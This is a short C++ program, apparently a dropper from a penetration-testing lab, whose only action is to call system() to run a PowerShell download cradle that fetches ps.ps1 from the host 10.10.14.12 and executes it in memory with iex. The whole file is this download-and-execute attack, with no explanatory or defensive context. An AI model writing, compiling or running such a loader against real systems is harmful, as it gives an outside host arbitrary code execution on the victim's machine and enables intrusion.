#include <iostream>
#include <cstdlib>

int main() {

	system("powershell iex(new-object net.webclient).downloadstring('http://10.10.14.12/ps.ps1')");
	return 0;
}